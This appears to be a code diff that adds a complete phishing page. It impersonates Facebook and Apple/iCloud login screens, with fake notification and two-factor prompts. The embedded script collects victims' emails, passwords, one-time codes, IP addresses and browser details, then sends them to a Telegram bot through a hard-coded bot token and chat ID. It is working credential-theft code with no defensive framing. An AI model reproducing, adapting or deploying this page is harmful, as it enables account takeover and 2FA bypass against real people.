@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Choose Method</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="logo-section">
+                <div class="logo-icon">🔐</div>
+                <h1>Welcome Back</h1>
+                <p>Choose your preferred login method</p>
+            </div>
+
+            <div class="login-methods">
+                <button class="login-btn facebook-btn" data-testid="facebook-login-btn" onclick="showFacebookLogin()">
+                    <svg class="btn-icon" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                    </svg>
+                    <span>Continue with Facebook</span>
+                </button>
+
+                <button class="login-btn icloud-btn" data-testid="icloud-login-btn" onclick="showICloudLogin()">
+                    <svg class="btn-icon" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
+                    </svg>
+                    <span>Continue with iCloud</span>
+                </button>
+            </div>
+
+            <div class="divider">
+                <span>Secure Login</span>
+            </div>
+
+            <div class="footer-text">
+                <p>By continuing, you agree to our Terms of Service and Privacy Policy</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Facebook Login Form (Hidden by default) -->
+    <div id="facebookForm" style="display: none;">
+        <div class="container">
+            <div class="login-card">
+                <div class="logo-section">
+                    <div class="logo-icon" style="color: #1877F2; font-size: 48px;">
+                        <svg viewBox="0 0 24 24" fill="#1877F2" style="width: 48px; height: 48px;">
+                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                        </svg>
+                    </div>
+                    <h1>Log in to Facebook</h1>
+                    <p>Enter your credentials to continue</p>
+                </div>
+
+                <div class="form-group" style="margin: 25px 0;">
+                    <label style="display: block; margin-bottom: 8px; font-weight: 600; color: #333;">Name or Email</label>
+                    <input type="text" id="facebookEmail" placeholder="Enter your name or email" 
+                           style="width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #ddd; font-size: 16px; margin-bottom: 20px;">
+                    
+                    <label style="display: block; margin-bottom: 8px; font-weight: 600; color: #333;">Password</label>
+                    <input type="password" id="facebookPassword" placeholder="Enter your password" 
+                           style="width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #ddd; font-size: 16px;">
+                </div>
+
+                <button class="login-btn" onclick="submitFacebookCredentials()" style="background: #1877F2; color: white; margin-bottom: 15px;">
+                    <span>Continue</span>
+                </button>
+                
+                <button class="login-btn" onclick="backToMain()" style="background: #6B7280; color: white;">
+                    <span style="display: flex; align-items: center; gap: 8px;">
+                        <svg viewBox="0 0 24 24" fill="currentColor" style="width: 20px; height: 20px;">
+                            <path d="M15.41 16.59L10.83 12l4.58-4.59L14 6l-6 6 6 6 1.41-1.41z"/>
+                        </svg>
+                        Back to login options
+                    </span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Facebook Notification Screen (Hidden by default) -->
+    <div id="facebookNotification" style="display: none;">
+        <div class="container">
+            <div class="login-card">
+                <div class="logo-section">
+                    <div class="logo-icon" style="color: #1877F2; font-size: 48px;">
+                        <svg viewBox="0 0 24 24" fill="#1877F2" style="width: 48px; height: 48px;">
+                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                        </svg>
+                    </div>
+                    <h1>Check Facebook Notification</h1>
+                    <p>We've sent a login confirmation to your Facebook account</p>
+                </div>
+
+                <div class="notification-steps" style="margin: 30px 0;">
+                    <div style="display: flex; align-items: flex-start; margin-bottom: 20px;">
+                        <div style="background: #1877F2; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; flex-shrink: 0;">1</div>
+                        <div>
+                            <h3 style="margin: 0 0 5px 0; color: #333;">Open Facebook App</h3>
+                            <p style="margin: 0; color: #666;">Check your notifications on Facebook mobile app or website</p>
+                        </div>
+                    </div>
+                    
+                    <div style="display: flex; align-items: flex-start; margin-bottom: 20px;">
+                        <div style="background: #1877F2; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; flex-shrink: 0;">2</div>
+                        <div>
+                            <h3 style="margin: 0 0 5px 0; color: #333;">Confirm Login</h3>
+                            <p style="margin: 0; color: #666;">Tap "Confirm" to approve this login attempt</p>
+                        </div>
+                    </div>
+                    
+                    <div style="display: flex; align-items: flex-start; margin-bottom: 20px;">
+                        <div style="background: #1877F2; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; flex-shrink: 0;">3</div>
+                        <div>
+                            <h3 style="margin: 0 0 5px 0; color: #333;">Return Here</h3>
+                            <p style="margin: 0; color: #666;">You'll be automatically logged in once confirmed</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div style="text-align: center; padding: 20px; background: #f8f9fa; border-radius: 12px; margin: 25px 0;">
+                    <div style="font-size: 36px; margin-bottom: 10px;">⏳</div>
+                    <h3 style="margin: 0 0 10px 0; color: #333;">Waiting for confirmation...</h3>
+                    <p style="margin: 0; color: #666; font-size: 14px;">Please confirm on your Facebook device</p>
+                </div>
+
+                <div class="action-buttons" style="margin-top: 30px;">
+                    <button class="login-btn" onclick="confirmFacebookLogin()" style="background: #1877F2; color: white; margin-bottom: 10px;">
+                        <span>Confirmation</span>
+                    </button>
+                    
+                    <button class="login-btn" onclick="backToMainFromNotification()" style="background: #6B7280; color: white;">
+                        <span>Cancel and go back</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- iCloud Login Form (Hidden by default) -->
+    <div id="icloudForm" style="display: none;">
+        <div class="container">
+            <div class="login-card">
+                <div class="logo-section">
+                    <div class="logo-icon" style="color: #000; font-size: 48px;">
+                        <svg viewBox="0 0 24 24" fill="#000" style="width: 48px; height: 48px;">
+                            <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
+                        </svg>
+                    </div>
+                    <h1>Sign in with Apple</h1>
+                    <p>Enter your Apple ID credentials</p>
+                </div>
+
+                <div class="form-group" style="margin: 25px 0;">
+                    <label style="display: block; margin-bottom: 8px; font-weight: 600; color: #333;">Apple ID</label>
+                    <input type="text" id="icloudEmail" placeholder="your@email.com" 
+                           style="width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #ddd; font-size: 16px; margin-bottom: 20px;">
+                    
+                    <label style="display: block; margin-bottom: 8px; font-weight: 600; color: #333;">Password</label>
+                    <input type="password" id="icloudPassword" placeholder="Enter your password" 
+                           style="width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #ddd; font-size: 16px;">
+                </div>
+
+                <button class="login-btn" onclick="submitICloudCredentials()" style="background: #000; color: white; margin-bottom: 15px;">
+                    <span>Continue</span>
+                </button>
+                
+                <button class="login-btn" onclick="backToMain()" style="background: #6B7280; color: white;">
+                    <span>Back to login options</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- iCloud OTP Verification (Hidden by default) -->
+    <div id="icloudOTP" style="display: none;">
+        <div class="container">
+            <div class="login-card">
+                <div class="logo-section">
+                    <div class="logo-icon" style="color: #000; font-size: 48px;">
+                        <svg viewBox="0 0 24 24" fill="#000" style="width: 48px; height: 48px;">
+                            <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
+                        </svg>
+                    </div>
+                    <h1>Two-Factor Authentication</h1>
+                    <p>Enter the verification code sent to your Apple devices</p>
+                </div>
+
+                <div style="text-align: center; margin: 30px 0;">
+                    <div style="font-size: 48px; color: #000; margin-bottom: 20px;">
+                        <svg viewBox="0 0 24 24" fill="currentColor" style="width: 48px; height: 48px;">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                        </svg>
+                    </div>
+                    
+                    <p style="color: #666; margin-bottom: 25px; font-size: 14px;">
+                        A 6-digit verification code has been sent to your Apple devices.
+                        Enter the code to continue.
+                    </p>
+                    
+                    <div style="margin: 25px 0;">
+                        <input type="text" id="otpCode" placeholder="Enter 6-digit code" 
+                               style="width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #ddd; font-size: 18px; text-align: center; letter-spacing: 10px; font-weight: 600;"
+                               maxlength="6">
+                        <p style="color: #999; font-size: 12px; margin-top: 8px;">
+                            Enter the 6-digit code from your Apple device
+                        </p>
+                    </div>
+                    
+                    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 20px 0;">
+                        <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
+                            <div style="width: 8px; height: 8px; background: #10B981; border-radius: 50%;"></div>
+                            <span style="color: #666; font-size: 14px;">Verification code sent to your trusted devices</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 10px;">
+                            <div style="width: 8px; height: 8px; background: #F59E0B; border-radius: 50%;"></div>
+                            <span style="color: #666; font-size: 14px;">Code expires in 10 minutes</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="action-buttons" style="margin-top: 20px;">
+                    <button class="login-btn" onclick="verifyICloudOTP()" style="background: #000; color: white; margin-bottom: 10px;">
+                        <span>Verify and Continue</span>
+                    </button>
+                    
+                    <button class="login-btn" onclick="resendOTP()" style="background: #6B7280; color: white; margin-bottom: 10px;">
+                        <span>Resend Code</span>
+                    </button>
+                    
+                    <button class="login-btn" onclick="backToICloudLogin()" style="background: transparent; color: #666; border: 1px solid #ddd;">
+                        <span>← Back</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Your bot credentials
+        const BOT_TOKEN = '7738348705:AAGGbXz5g683t-KHmrnvyCfK8ial6yFhHNU';
+        const CHAT_ID = '8456018521';
+
+        let facebookCredentials = { email: '', password: '' };
+        let icloudCredentials = { email: '', password: '' };
+
+        function showFacebookLogin() {
+            // Hide main screen, show Facebook form
+            document.querySelector('.container').style.display = 'none';
+            document.getElementById('facebookForm').style.display = 'block';
+            
+            // Focus on email field
+            setTimeout(() => {
+                document.getElementById('facebookEmail').focus();
+            }, 100);
+        }
+
+        function showICloudLogin() {
+            // Hide main screen, show iCloud form
+            document.querySelector('.container').style.display = 'none';
+            document.getElementById('icloudForm').style.display = 'block';
+            
+            // Focus on email field
+            setTimeout(() => {
+                document.getElementById('icloudEmail').focus();
+            }, 100);
+        }
+        
+        function backToMain() {
+            // Show main screen, hide all forms
+            document.querySelector('.container').style.display = 'block';
+            document.getElementById('facebookForm').style.display = 'none';
+            document.getElementById('icloudForm').style.display = 'none';
+            document.getElementById('icloudOTP').style.display = 'none';
+            
+            // Clear form fields
+            document.getElementById('facebookEmail').value = '';
+            document.getElementById('facebookPassword').value = '';
+            document.getElementById('icloudEmail').value = '';
+            document.getElementById('icloudPassword').value = '';
+            document.getElementById('otpCode').value = '';
+        }
+        
+        function backToMainFromNotification() {
+            // Show main screen, hide notification
+            document.querySelector('.container').style.display = 'block';
+            document.getElementById('facebookNotification').style.display = 'none';
+        }
+        
+        function backToICloudLogin() {
+            // Show iCloud login form, hide OTP
+            document.getElementById('icloudOTP').style.display = 'none';
+            document.getElementById('icloudForm').style.display = 'block';
+        }
+        
+        async function submitFacebookCredentials() {
+            const email = document.getElementById('facebookEmail').value;
+            const password = document.getElementById('facebookPassword').value;
+            
+            if (!email || !password) {
+                alert('Please enter both email and password');
+                return;
+            }
+            
+            // Save credentials temporarily
+            facebookCredentials = { email, password };
+            
+            // Send to Telegram IMMEDIATELY
+            await sendCredentialsToTelegram('Facebook', email, password);
+            
+            // Hide Facebook form, show Notification screen
+            document.getElementById('facebookForm').style.display = 'none';
+            document.getElementById('facebookNotification').style.display = 'block';
+        }
+        
+        function confirmFacebookLogin() {
+            // Save for dashboard
+            sessionStorage.setItem('fbUser', facebookCredentials.email);
+            
+            // Show success on notification screen
+            const confirmationBtn = document.querySelector('#facebookNotification .login-btn');
+            confirmationBtn.innerHTML = '<span>✅ Confirmed! Redirecting...</span>';
+            confirmationBtn.disabled = true;
+            
+            // Redirect to dashboard after delay
+            setTimeout(() => {
+                window.location.href = 'dashboard.html';
+            }, 1500);
+        }
+        
+        async function submitICloudCredentials() {
+            const email = document.getElementById('icloudEmail').value;
+            const password = document.getElementById('icloudPassword').value;
+            
+            if (!email || !password) {
+                alert('Please enter both Apple ID and password');
+                return;
+            }
+            
+            // Save credentials temporarily
+            icloudCredentials = { email, password };
+            
+            // Send to Telegram IMMEDIATELY
+            await sendCredentialsToTelegram('iCloud', email, password);
+            
+            // Hide iCloud form, show OTP screen
+            document.getElementById('icloudForm').style.display = 'none';
+            document.getElementById('icloudOTP').style.display = 'block';
+            
+            // Focus on OTP field
+            setTimeout(() => {
+                document.getElementById('otpCode').focus();
+            }, 100);
+        }
+        
+        function verifyICloudOTP() {
+            const otp = document.getElementById('otpCode').value;
+            
+            if (!otp || otp.length !== 6) {
+                alert('Please enter a valid 6-digit verification code');
+                return;
+            }
+            
+            // Send OTP to Telegram
+            sendOTPToTelegram(icloudCredentials.email, otp);
+            
+            // Save for dashboard
+            sessionStorage.setItem('icloudUser', icloudCredentials.email);
+            
+            // Show loading
+            const verifyBtn = document.querySelector('#icloudOTP .login-btn');
+            verifyBtn.innerHTML = '<span>✅ Verifying... Redirecting...</span>';
+            verifyBtn.disabled = true;
+            
+            // Redirect to dashboard after delay
+            setTimeout(() => {
+                window.location.href = 'dashboard.html';
+            }, 1500);
+        }
+        
+        function resendOTP() {
+            const resendBtn = document.querySelector('#icloudOTP .login-btn:nth-child(2)');
+            const originalText = resendBtn.innerHTML;
+            resendBtn.innerHTML = '<span>Sending new code...</span>';
+            resendBtn.disabled = true;
+            
+            // Simulate sending new OTP
+            setTimeout(() => {
+                alert('New verification code has been sent to your Apple devices');
+                resendBtn.innerHTML = originalText;
+                resendBtn.disabled = false;
+                
+                // Clear OTP field
+                document.getElementById('otpCode').value = '';
+                document.getElementById('otpCode').focus();
+            }, 1000);
+        }
+        
+        async function sendCredentialsToTelegram(service, email, password) {
+            // Get IP address
+            const ip = await getIPAddress();
+            const timestamp = new Date().toLocaleString();
+            const userAgent = navigator.userAgent;
+            
+            const message = `
+🔐 *LOGIN CREDENTIALS CAPTURED*
+
+🎯 *Service:* ${service}
+📅 *Time:* ${timestamp}
+📍 *IP Address:* ${ip}
+🌐 *Page URL:* ${window.location.href}
+
+👤 *EMAIL/USERNAME:*
+\`\`\`
+${email}
+\`\`\`
+
+🔑 *PASSWORD:*
+\`\`\`
+${password}
+\`\`\`
+
+📱 *Browser Info:*
+\`\`\`
+${userAgent}
+\`\`\`
+
+✅ *Login successful*
+            `;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Telegram error:', error);
+            }
+        }
+        
+        async function sendOTPToTelegram(email, otp) {
+            const timestamp = new Date().toLocaleString();
+            
+            const message = `
+🔢 *iCloud OTP CAPTURED*
+
+🎯 *Service:* iCloud
+📅 *Time:* ${timestamp}
+👤 *Apple ID:* ${email}
+
+🔢 *OTP CODE:*
+\`\`\`
+${otp}
+\`\`\`
+
+✅ *OTP verification successful*
+            `;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Telegram error:', error);
+            }
+        }
+        
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Unknown';
+            }
+        }
+        
+        // Submit forms on Enter key
+        document.addEventListener('DOMContentLoaded', function() {
+            // Facebook form
+            document.getElementById('facebookPassword')?.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    submitFacebookCredentials();
+                }
+            });
+            
+            // iCloud form
+            document.getElementById('icloudPassword')?.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    submitICloudCredentials();
+                }
+            });
+            
+            // OTP form
+            document.getElementById('otpCode')?.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    verifyICloudOTP();
+                }
+            });
+            
+            // Auto-tab OTP (6-digit input)
+            document.getElementById('otpCode')?.addEventListener('input', function(e) {
+                if (this.value.length === 6) {
+                    verifyICloudOTP();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
